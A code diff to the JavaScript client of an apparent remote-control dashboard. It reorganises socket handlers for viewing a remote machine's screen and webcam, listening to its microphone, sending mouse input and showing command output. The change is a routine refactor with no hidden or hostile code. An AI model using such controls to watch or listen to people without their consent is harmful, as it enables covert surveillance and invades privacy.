@@ -96,14 +96,117 @@ function setupSocketEvents() {
     console.error("⏱️ Socket bağlantı zaman aşımı");
   });
   
-  // Diğer socket event'leri buraya eklenecek (mevcut kodlar)
-  setupOtherSocketEvents();
+  // Socket event'leri - connect event
+  socket.on("connect", function () {
+    console.log(socket.id);
+    socket.emit("joinToRoom", { roomName: "dashboard-" + info.dashboardId });
+  });
+
+  socket.on("disconnect", function () {
+    console.log("Disconnected !");
+  });
+
+  socket.on("screenshotResponse", function (data) {
+    !!data.src ? console.log('+') : console.log('-');
+
+    if (data.src.length > 0) {
+      $(".listOfScreensAndWindows").html(
+        '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
+        data.src +
+        "></div>"
+      );
+    }
+    getScreenshot();
+  });
+
+  socket.on("camShotResponse", function (data) {
+    $(".listOfScreensAndWindows").html(
+      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
+      data.src +
+      "></div>"
+    );
+  });
+
+  socket.on("camBinary", function (data) {
+    const blob = new Blob([data.data], { type: 'image/jpeg' });
+    const url = URL.createObjectURL(blob);
+    $(".listOfScreensAndWindows").html(
+      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src="' + url + '"></div>'
+    );
+    setTimeout(() => URL.revokeObjectURL(url), 1000);
+  });
+
+  socket.on("audioStreamResponse", function (data) {
+    console.log("🎵 Audio stream response received from server");
+    
+    if (data.audioData) {
+      console.log("🎵 Audio chunk received:", data.audioData.length, "chars (base64)");
+      
+      try {
+        const binaryString = atob(data.audioData);
+        const bytes = new Uint8Array(binaryString.length);
+        for (let i = 0; i < binaryString.length; i++) {
+          bytes[i] = binaryString.charCodeAt(i);
+        }
+        
+        let mimeType = 'audio/webm';
+        if (data.mimeType) {
+          mimeType = data.mimeType;
+        }
+        
+        const blob = new Blob([bytes], { type: mimeType });
+        const url = URL.createObjectURL(blob);
+        
+        if (currentAudioUrl) {
+          URL.revokeObjectURL(currentAudioUrl);
+        }
+        
+        currentAudioUrl = url;
+        
+        const audioElement = document.getElementById("audioStream");
+        audioElement.src = url;
+        audioElement.volume = 1.0;
+        audioElement.muted = false;
+        audioElement.preload = "auto";
+        
+        audioElement.play().then(() => {
+          console.log("✅ Audio playing successfully");
+        }).catch(e => {
+          console.error("❌ Audio play error:", e);
+        });
+        
+      } catch (error) {
+        console.error("❌ Error processing audio data:", error);
+      }
+    }
+  });
+
+  socket.on("audioListenStatus", function (data) {
+    const statusText = document.getElementById("audioStatusText");
+    
+    if (data.status === "started") {
+      statusText.textContent = "Listening (high sensitivity)...";
+      statusText.className = "text-success";
+    } else if (data.status === "stopped") {
+      statusText.textContent = "Stopped";
+      statusText.className = "text-muted";
+    } else if (data.status === "error") {
+      statusText.textContent = "Error: " + data.error;
+      statusText.className = "text-danger";
+    }
+  });
+
+  socket.on("getRunResponse", function (data) {
+    console.log({ getRunResponse: data });
+    $(".cmdArea").text(data.cmd);
+  });
 }
 
-function setupOtherSocketEvents() {
-  if (!socket) return;
+// Audio URL için global değişken
+let currentAudioUrl = null;
 
 function getScreenshot() {
+  if (!socket || !socket.connected) return;
   var data = {
     from: "terminal-" + $(".terminalId").val(),
     to: "dashboard-" + info.dashboardId,
@@ -114,6 +217,7 @@ function getScreenshot() {
 }
 
 function getCamShot(one = false) {
+  if (!socket || !socket.connected) return;
   var data = {
     from: "terminal-" + $(".terminalId").val(),
     to: "dashboard-" + info.dashboardId,
@@ -125,6 +229,7 @@ function getCamShot(one = false) {
 }
 
 function startAudioListen() {
+  if (!socket || !socket.connected) return;
   var data = {
     from: "terminal-" + $(".terminalId").val(),
     to: "dashboard-" + info.dashboardId,
@@ -134,6 +239,7 @@ function startAudioListen() {
 }
 
 function stopAudioListen() {
+  if (!socket || !socket.connected) return;
   var data = {
     from: "terminal-" + $(".terminalId").val(),
     to: "dashboard-" + info.dashboardId,
@@ -153,136 +259,6 @@ function stopAudioListen() {
   
   console.log("🔇 Audio stream stopped and cleaned up (2s intervals)");
 }
-
-socket.on("connect", function () {
-  console.log(socket.id);
-  socket.emit("joinToRoom", { roomName: "dashboard-" + info.dashboardId });
-});
-
-socket.on("disconnect", function () {
-  console.log("Disconnected !");
-});
-
-socket.on("screenshotResponse", function (data) {
-  !!data.src ? console.log('+') : console.log('-');
-
-  if (data.src.length > 0) {
-    $(".listOfScreensAndWindows").html(
-      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
-      data.src +
-      "></div>"
-    );
-  }
-  getScreenshot();
-});
-
-socket.on("camShotResponse", function (data) {
-  $(".listOfScreensAndWindows").html(
-    '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
-    data.src +
-    "></div>"
-  );
-  //getCamShot();
-});
-
-// Binary transfer response handler
-socket.on("camBinary", function (data) {
-  const blob = new Blob([data.data], { type: 'image/jpeg' });
-  const url = URL.createObjectURL(blob);
-  $(".listOfScreensAndWindows").html(
-    '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src="' + url + '"></div>'
-  );
-  // URL'yi temizle
-  setTimeout(() => URL.revokeObjectURL(url), 1000);
-});
-
-// Audio stream response handler - basit 2 saniye yaklaşımı
-let currentAudioUrl = null;
-
-socket.on("audioStreamResponse", function (data) {
-  console.log("🎵 Audio stream response received from server");
-  
-  if (data.audioData) {
-         console.log("🎵 Audio chunk received (20s):", data.audioData.length, "chars (base64)");
-    
-    try {
-      // Base64'ten binary'e çevir
-      const binaryString = atob(data.audioData);
-      const bytes = new Uint8Array(binaryString.length);
-      for (let i = 0; i < binaryString.length; i++) {
-        bytes[i] = binaryString.charCodeAt(i);
-      }
-      
-      console.log("🔧 Binary data size:", bytes.length, "bytes");
-      
-      // MIME type belirle
-      let mimeType = 'audio/webm';
-      if (data.mimeType) {
-        mimeType = data.mimeType;
-      }
-      
-      console.log("🔧 Creating audio blob with MIME type:", mimeType);
-      
-      // Blob oluştur
-      const blob = new Blob([bytes], { type: mimeType });
-      const url = URL.createObjectURL(blob);
-      
-      console.log("🔗 Created blob URL:", url);
-      
-      // Eski URL'yi temizle
-      if (currentAudioUrl) {
-        URL.revokeObjectURL(currentAudioUrl);
-      }
-      
-      currentAudioUrl = url;
-      
-      // Audio element'i güncelle
-      const audioElement = document.getElementById("audioStream");
-      audioElement.src = url;
-      audioElement.volume = 1.0; // Maksimum volume
-      
-      // Ses şiddetini artırmak için ek ayarlar
-      audioElement.muted = false;
-      audioElement.preload = "auto";
-      
-             console.log("🎯 Audio element updated with new 20-second chunk");
-      
-      // Otomatik oynat
-      audioElement.play().then(() => {
-                 console.log("✅ Audio playing successfully (20s chunk)");
-      }).catch(e => {
-        console.error("❌ Audio play error:", e);
-        console.error("Error details:", e.message);
-      });
-      
-    } catch (error) {
-      console.error("❌ Error processing audio data:", error);
-    }
-  } else {
-    console.log("⚠️ No audio data in response");
-  }
-});
-
-// Audio listen status handler
-socket.on("audioListenStatus", function (data) {
-  const statusText = document.getElementById("audioStatusText");
-  
-  if (data.status === "started") {
-    console.log("Audio listening started - high sensitivity mode");
-    statusText.textContent = "Listening (high sensitivity)...";
-    statusText.className = "text-success";
-  } else if (data.status === "stopped") {
-    console.log("Audio listening stopped");
-    statusText.textContent = "Stopped";
-    statusText.className = "text-muted";
-  } else if (data.status === "error") {
-    console.error("Audio listening error:", data.error);
-    statusText.textContent = "Error: " + data.error;
-    statusText.className = "text-danger";
-    // Alert'i kaldır - sadece console'da göster
-    console.log("Audio stream error occurred:", data.error);
-  }
-});
 
 $(document).ready(function () {
   if (localStorage.getItem("terminalId")) {
@@ -317,6 +293,7 @@ $(document).on("click", ".stopListenBtn", function () {
 });
 
 $(document).on("click", ".listOfScreensAndWindows", function () {
+  if (!socket || !socket.connected) return;
   var data = {
     from: "terminal-" + $(".terminalId").val(),
     to: "dashboard-" + info.dashboardId,
@@ -337,15 +314,13 @@ $(document).on("mousemove", ".listOfScreensAndWindows", function (e) {
       y: e.pageY - $(".listOfScreensAndWindows").offset().top,
     },
   };
-  socket.emit("mousemove", data);
-});
-
-socket.on("getRunResponse", function (data) {
-  console.log({ getRunResponse: data });
-  $(".cmdArea").text(data.cmd);
+  if (socket) {
+    socket.emit("mousemove", data);
+  }
 });
 
 function getRun() {
+  if (!socket || !socket.connected) return;
   var data = {
     from: "terminal-" + $(".terminalId").val(),
     to: "dashboard-" + info.dashboardId,
